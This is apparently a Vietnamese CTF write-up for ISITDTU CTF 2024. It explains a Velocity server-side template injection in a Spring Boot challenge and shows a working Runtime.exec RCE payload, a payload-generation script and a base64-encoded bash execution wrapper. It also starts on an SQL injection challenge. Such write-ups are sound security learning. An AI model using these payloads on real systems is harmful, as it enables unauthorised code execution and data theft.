<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='hihi Đây là một challenge whitebox, cung cấp cho mình source code, cung cấp một cách khá hay để khai thác SSTI Challenge sử dụng Springboot để build web, với 1 route duy nhất tại index, tại phương thức POST nhận đầu vào là data và xử lý để in ra chuỗi hello tên người dùng và thời gian:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @PostMapping({"/"}) @ResponseBody public String hello(@RequestParam("data") String data) throws IOException { String hexString = new String(Base64.getDecoder().decode(data)); byte[] byteArray = Encode.hexToBytes(hexString); ByteArrayInputStream bis = new ByteArrayInputStream(byteArray); ObjectInputStream ois = new SecureObjectInputStream(bis); String name; try { Users user = (Users)ois.readObject(); name = user.getName(); } catch (Exception var13) { throw new RuntimeException(var13); } if (name.toLowerCase().contains("#")) { return "But... For what?"; } else { String templateString = "Hello, " + name + ". Today is $date"; Velocity.init(); VelocityContext ctx = new VelocityContext(); LocalDate date = LocalDate.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy"); String formattedDate = date.format(formatter); ctx.put("date", formattedDate); StringWriter out = new StringWriter(); Velocity.evaluate(ctx, out, "test", templateString); return out.toString(); } } Giá trị từ param data được base64 decode, sau đó chuyển từ dạng hex sang bytes array và được deserialize (sus) Lấy giá trị name trong object thu được, và nối chuỗi vào templateString trước khi render -> SSTI. Tuy nhiên trước khi được nối chuỗi thì giá trị name được kiểm tra xem có chứa ký tự # không, nếu không có ký tự này ta sẽ không thể dùng được các syntax của tempalte như #set,&mldr; Không những vậy, tại class SecureObjectInputStream khi invoke method resolveClass thì class sẽ kiểm tra xem class đầu tiên phải là Users thì mới cho phép tiếu tục vào method resolveClass để tiếp tục deserialize\n'><title>ISITDTU CTF 2024</title><link rel=canonical href=https://kev1n1203.github.io/p/isitdtu-ctf-2024/><link rel=stylesheet href=/scss/style.min.43579eb5b8b82fae543c237cb1e0ed21184587621bafe6e42941bbb438644f4a.css><meta property='og:title' content="ISITDTU CTF 2024"><meta property='og:description' content='hihi Đây là một challenge whitebox, cung cấp cho mình source code, cung cấp một cách khá hay để khai thác SSTI Challenge sử dụng Springboot để build web, với 1 route duy nhất tại index, tại phương thức POST nhận đầu vào là data và xử lý để in ra chuỗi hello tên người dùng và thời gian:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @PostMapping({"/"}) @ResponseBody public String hello(@RequestParam("data") String data) throws IOException { String hexString = new String(Base64.getDecoder().decode(data)); byte[] byteArray = Encode.hexToBytes(hexString); ByteArrayInputStream bis = new ByteArrayInputStream(byteArray); ObjectInputStream ois = new SecureObjectInputStream(bis); String name; try { Users user = (Users)ois.readObject(); name = user.getName(); } catch (Exception var13) { throw new RuntimeException(var13); } if (name.toLowerCase().contains("#")) { return "But... For what?"; } else { String templateString = "Hello, " + name + ". Today is $date"; Velocity.init(); VelocityContext ctx = new VelocityContext(); LocalDate date = LocalDate.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy"); String formattedDate = date.format(formatter); ctx.put("date", formattedDate); StringWriter out = new StringWriter(); Velocity.evaluate(ctx, out, "test", templateString); return out.toString(); } } Giá trị từ param data được base64 decode, sau đó chuyển từ dạng hex sang bytes array và được deserialize (sus) Lấy giá trị name trong object thu được, và nối chuỗi vào templateString trước khi render -> SSTI. Tuy nhiên trước khi được nối chuỗi thì giá trị name được kiểm tra xem có chứa ký tự # không, nếu không có ký tự này ta sẽ không thể dùng được các syntax của tempalte như #set,&mldr; Không những vậy, tại class SecureObjectInputStream khi invoke method resolveClass thì class sẽ kiểm tra xem class đầu tiên phải là Users thì mới cho phép tiếu tục vào method resolveClass để tiếp tục deserialize\n'><meta property='og:url' content='https://kev1n1203.github.io/p/isitdtu-ctf-2024/'><meta property='og:site_name' content="kev1n's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='CTF'><meta property='article:published_time' content='2024-10-27T17:10:08+00:00'><meta property='article:modified_time' content='2024-10-27T17:10:08+00:00'><meta name=twitter:title content="ISITDTU CTF 2024"><meta name=twitter:description content='hihi Đây là một challenge whitebox, cung cấp cho mình source code, cung cấp một cách khá hay để khai thác SSTI Challenge sử dụng Springboot để build web, với 1 route duy nhất tại index, tại phương thức POST nhận đầu vào là data và xử lý để in ra chuỗi hello tên người dùng và thời gian:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @PostMapping({"/"}) @ResponseBody public String hello(@RequestParam("data") String data) throws IOException { String hexString = new String(Base64.getDecoder().decode(data)); byte[] byteArray = Encode.hexToBytes(hexString); ByteArrayInputStream bis = new ByteArrayInputStream(byteArray); ObjectInputStream ois = new SecureObjectInputStream(bis); String name; try { Users user = (Users)ois.readObject(); name = user.getName(); } catch (Exception var13) { throw new RuntimeException(var13); } if (name.toLowerCase().contains("#")) { return "But... For what?"; } else { String templateString = "Hello, " + name + ". Today is $date"; Velocity.init(); VelocityContext ctx = new VelocityContext(); LocalDate date = LocalDate.now(); DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy"); String formattedDate = date.format(formatter); ctx.put("date", formattedDate); StringWriter out = new StringWriter(); Velocity.evaluate(ctx, out, "test", templateString); return out.toString(); } } Giá trị từ param data được base64 decode, sau đó chuyển từ dạng hex sang bytes array và được deserialize (sus) Lấy giá trị name trong object thu được, và nối chuỗi vào templateString trước khi render -> SSTI. Tuy nhiên trước khi được nối chuỗi thì giá trị name được kiểm tra xem có chứa ký tự # không, nếu không có ký tự này ta sẽ không thể dùng được các syntax của tempalte như #set,&mldr; Không những vậy, tại class SecureObjectInputStream khi invoke method resolveClass thì class sẽ kiểm tra xem class đầu tiên phải là Users thì mới cho phép tiếu tục vào method resolveClass để tiếp tục deserialize\n'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_80bb896afdf080a5.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>kev1n's Blog</a></h1><h2 class=site-description>Trung Hậu - Thành viên ăn hại tại KCSC</h2></div></header><ol class=menu-social><li><a href=https://github.com/kev1n1203 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://x.com/kev1n1203 target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#hihi>hihi</a></li><li><a href=#hero>Hero</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/isitdtu-ctf-2024/>ISITDTU CTF 2024</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2024-10-27T17:10:08Z>Oct 27, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>7 minute read</time></div></footer></div></header><section class=article-content><h2 id=hihi>hihi</h2><p>Đây là một challenge whitebox, cung cấp cho mình source code, cung cấp một cách khá hay để khai thác SSTI
Challenge sử dụng Springboot để build web, với 1 route duy nhất tại index, tại phương thức POST nhận đầu vào là data và xử lý để in ra chuỗi hello tên người dùng và thời gian:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>@</span><span class=n>PostMapping</span><span class=p>({</span><span class=s2>&#34;/&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>ResponseBody</span>
</span></span><span class=line><span class=cl><span class=n>public</span> <span class=ne>String</span> <span class=n>hello</span><span class=p>(</span><span class=err>@</span><span class=n>RequestParam</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>)</span> <span class=ne>String</span> <span class=n>data</span><span class=p>)</span> <span class=n>throws</span> <span class=n>IOException</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>hexString</span> <span class=o>=</span> <span class=n>new</span> <span class=ne>String</span><span class=p>(</span><span class=n>Base64</span><span class=o>.</span><span class=n>getDecoder</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>data</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>byte</span><span class=p>[]</span> <span class=n>byteArray</span> <span class=o>=</span> <span class=n>Encode</span><span class=o>.</span><span class=n>hexToBytes</span><span class=p>(</span><span class=n>hexString</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>ByteArrayInputStream</span> <span class=n>bis</span> <span class=o>=</span> <span class=n>new</span> <span class=n>ByteArrayInputStream</span><span class=p>(</span><span class=n>byteArray</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>ObjectInputStream</span> <span class=n>ois</span> <span class=o>=</span> <span class=n>new</span> <span class=n>SecureObjectInputStream</span><span class=p>(</span><span class=n>bis</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=ne>String</span> <span class=n>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Users</span> <span class=n>user</span> <span class=o>=</span> <span class=p>(</span><span class=n>Users</span><span class=p>)</span><span class=n>ois</span><span class=o>.</span><span class=n>readObject</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span> <span class=o>=</span> <span class=n>user</span><span class=o>.</span><span class=n>getName</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=n>catch</span> <span class=p>(</span><span class=n>Exception</span> <span class=n>var13</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>throw</span> <span class=n>new</span> <span class=n>RuntimeException</span><span class=p>(</span><span class=n>var13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>name</span><span class=o>.</span><span class=n>toLowerCase</span><span class=p>()</span><span class=o>.</span><span class=n>contains</span><span class=p>(</span><span class=s2>&#34;#&#34;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;But... For what?&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>templateString</span> <span class=o>=</span> <span class=s2>&#34;Hello, &#34;</span> <span class=o>+</span> <span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;. Today is $date&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Velocity</span><span class=o>.</span><span class=n>init</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>VelocityContext</span> <span class=n>ctx</span> <span class=o>=</span> <span class=n>new</span> <span class=n>VelocityContext</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>LocalDate</span> <span class=n>date</span> <span class=o>=</span> <span class=n>LocalDate</span><span class=o>.</span><span class=n>now</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>DateTimeFormatter</span> <span class=n>formatter</span> <span class=o>=</span> <span class=n>DateTimeFormatter</span><span class=o>.</span><span class=n>ofPattern</span><span class=p>(</span><span class=s2>&#34;MMMM dd, yyyy&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=ne>String</span> <span class=n>formattedDate</span> <span class=o>=</span> <span class=n>date</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>formatter</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>ctx</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=s2>&#34;date&#34;</span><span class=p>,</span> <span class=n>formattedDate</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>StringWriter</span> <span class=n>out</span> <span class=o>=</span> <span class=n>new</span> <span class=n>StringWriter</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=n>Velocity</span><span class=o>.</span><span class=n>evaluate</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>out</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>,</span> <span class=n>templateString</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>out</span><span class=o>.</span><span class=n>toString</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>Giá trị từ param <code>data</code> được base64 decode, sau đó chuyển từ dạng hex sang bytes array và được deserialize (sus)</li><li>Lấy giá trị name trong object thu được, và nối chuỗi vào templateString trước khi render -> SSTI. Tuy nhiên trước khi được nối chuỗi thì giá trị name được kiểm tra xem có chứa ký tự <code>#</code> không, nếu không có ký tự này ta sẽ không thể dùng được các syntax của tempalte như <code>#set</code>,&mldr;</li></ul><p>Không những vậy, tại class <code>SecureObjectInputStream</code> khi invoke method <code>resolveClass</code> thì class sẽ kiểm tra xem class đầu tiên phải là Users thì mới cho phép tiếu tục vào method resolveClass để tiếp tục deserialize</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@Override
</span></span><span class=line><span class=cl>protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException ,ClassNotFoundException{
</span></span><span class=line><span class=cl>    List&lt;String&gt; approvedClass = new ArrayList&lt;String&gt;();
</span></span><span class=line><span class=cl>    approvedClass.add(Users.class.getName());
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if(!approvedClass.contains(osc.getName())){
</span></span><span class=line><span class=cl>        throw new InvalidClassException(&#34;Can not deserialize this class! &#34;,osc.getName());
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    return super.resolveClass(osc);
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><ul><li>Nhìn chung là để attack deserialize thì khó =))</li></ul><p>Nhưng trước hết thì mình cũng cần phải code lại script để gen ra được data đã, object Users sẽ đi theo flow sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>serialize -&gt; bytestohex -&gt; base64 encode
</span></span></code></pre></td></tr></table></div></div><p>Resource từ source code gốc đã có gần như đủ cả, mình tạo thêm method bytesToHex tại class Encode:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public static String bytesToHex(byte[] bytes) {
</span></span><span class=line><span class=cl>    StringBuilder hexString = new StringBuilder(2 * bytes.length);
</span></span><span class=line><span class=cl>    for (byte b : bytes) {
</span></span><span class=line><span class=cl>        String hex = Integer.toHexString(b &amp; 0xFF);
</span></span><span class=line><span class=cl>        if (hex.length() == 1) {
</span></span><span class=line><span class=cl>            hexString.append(&#39;0&#39;);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        hexString.append(hex);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    return hexString.toString();
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>Main method của mình như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Users user = new Users();
</span></span><span class=line><span class=cl>user.setName(&#34;user1337&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ByteArrayOutputStream bos = new ByteArrayOutputStream();
</span></span><span class=line><span class=cl>ObjectOutputStream oos = new ObjectOutputStream(bos);
</span></span><span class=line><span class=cl>oos.writeObject(user);
</span></span><span class=line><span class=cl>oos.flush();
</span></span><span class=line><span class=cl>oos.close();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>byte[] byteArray = bos.toByteArray();
</span></span><span class=line><span class=cl>String hexString = Encode.bytesToHex(byteArray);
</span></span><span class=line><span class=cl>String data = Base64.getEncoder().encodeToString(hexString.getBytes());
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>System.out.println(data);
</span></span></code></pre></td></tr></table></div></div><p>Ta có base64 value của giá trị serialize là <code>YWNlZDAwMDU3MzcyMDAxNjYzNmY2ZDJlNjk3MzY5NzQ2NDc0NzUyZTY4Njk2ODY5MmU1NTczNjU3MjczNzA4NTI1ZDliYTNiZWZiMzAyMDAwMTRjMDAwNDZlNjE2ZDY1NzQwMDEyNGM2YTYxNzY2MTJmNmM2MTZlNjcyZjUzNzQ3MjY5NmU2NzNiNzg3MDc0MDAwODc1NzM2NTcyMzEzMzMzMzc=</code>
<img src=https://hackmd.io/_uploads/SyyNBsoxkl.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/r19jrose1g.png loading=lazy alt=image><br></p><p>Giờ mình cần tìm cách để exploit SSTI, với việc không thể sử dụng dấu <code>#</code> thì mình không thể tạo được biến nào để gọi method từ biến đó ra vì không dùng được <code>#set()</code>
Mình chuyển qua việc sử dụng những gì mình có, cụ thể là biến <code>$date</code> được khai báo đồng thời trong templateString, với kiểu dữ liệu là String. Đây là một variable hoàn hảo mình có thể lợi dụng để có thể invoke đến Runtime.exec.
Payload mình tìm kiếm và tham khảo tại: <a class=link href=https://blog.csdn.net/weixin_39190897/article/details/139707252 target=_blank rel=noopener>https://blog.csdn.net/weixin_39190897/article/details/139707252</a>
Ban đầu mình confirm bug bằng việc tạo file tại /tmp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$date.getClass().forName(&#39;java.lang.Runtime&#39;).getMethod(&#39;getRuntime&#39;,null).invoke(null,null).exec(&#39;touch /tmp/1337&#39;)
</span></span></code></pre></td></tr></table></div></div><p>Đưa nó vào script và gửi, mình thấy câu lệnh được thực thi thành công vì kết quả trả về là pid của tiến trình thực hiện tạo file:
<img src=https://hackmd.io/_uploads/Hy0aLojgJl.png loading=lazy alt=image><br>File /tmp/1337 đã xuất hiện, confirm payload RCE thành công:
<img src=https://hackmd.io/_uploads/HkbGPssxJg.png loading=lazy alt=image><br>Tuy đã RCE, nhưng challenge config iptables để chặn connection qua chain DROP (cũng na ná chall niceray), nên mình không reverse shell mà đi tìm cách lấy nội dung file flag qua webroot.
Trong Springboot thì để xuất hiện webroot, ta cần đưa file vào thư mục: <code>/tmp/tomcat-docbase.8080....</code>, mỗi lần deploy thì giá trị đằng sau sẽ là các ký tự khác, nhưng prefix đằng trước sẽ luôn là <code>tomcat-docbase.8080.</code>.
Mình thử echo nội dung vào 1 file trong đó:
<img src=https://hackmd.io/_uploads/H1k-_joeke.png loading=lazy alt=image><br>Nội dung file được hiện lên webroot:
<img src=https://hackmd.io/_uploads/ByYfdjjlkl.png loading=lazy alt=image><br>Như vậy thì mình có thể lấy nội dung flag thông qua folder này, và trong Runtime.exec vì tại method này Java sẽ coi các argument của command cách nhau bởi dấu cách, nên để thuận lợi trong việc sử command thì mình sử dụng:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>bash -c {echo,base64command}|{base64,-d}|{bash,-i}
</span></span></code></pre></td></tr></table></div></div><p>Flag được đưa vào thư mục /app, nên mình sẽ ls để lấy tên file trước:
<img src=https://hackmd.io/_uploads/rkmnOiigyl.png loading=lazy alt=image><br>Mình cd vào thư mục đó trước rồi lấy oputput vào file <code>13373269.txt</code>
<img src=https://hackmd.io/_uploads/HJyfFisgkx.png loading=lazy alt=image><br>Ốp vào đoạn code gen của mình và send, kết quả mình có flag tên là <code>eg5mhk3q9yp3</code>:
<img src=https://hackmd.io/_uploads/S1LPYjseyg.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/rywqFsixJx.png loading=lazy alt=image><br>Giờ thì chỉ việc làm điều tương tự với cat file thôi là mình có flag trên local:
<img src=https://hackmd.io/_uploads/HktCKjslJg.png loading=lazy alt=image><br>Áp dụng lên server, mình có tên flag là <code>m62dyeu1gr3t</code>:
<img src=https://hackmd.io/_uploads/rJI75oixyl.png loading=lazy alt=image><br>Solve :heavy_check_mark:
<img src=https://hackmd.io/_uploads/SyEFqsjgJx.png loading=lazy alt=image><br></p><ul><li>Flag: <code>ISITDTU{We1come_t0_1s1tDTU_CTF}</code></li></ul><h2 id=hero>Hero</h2><p>Một challenge blackbox mà khi truy cập đến có độc mỗi chức năng đăng kỹ và đăng nhập:
<img src=https://hackmd.io/_uploads/rybHE9oxJx.png loading=lazy alt=image><br>Mình login với credential <code>a:a</code>, thì có 3 endpoint trang web cung cấp:</p><ul><li>/heroes</li><li>/genZ</li><li>/old_heroes</li></ul><p>Đầu tiên mình nghĩ có thể SQLi tại /genZ nhưng fuzz một hồi không có gì tiến triển ngoài or 1=1 thì mình chuyển qua endpoint /old_heroes, tại đây có param name mà khi truyền chuỗi thông thường sẽ thông báo lỗi: <code>Invalid object name 'OldHeroDB..'</code>
Khá lạ với kiểu response này, mình tiếp tục fuzzing và truyền dấu nháy các kiểu thì nhận được kiểu lỗi khác nhau, mỗi lỗi lại văng ra một ít phần câu lệnh SQL:
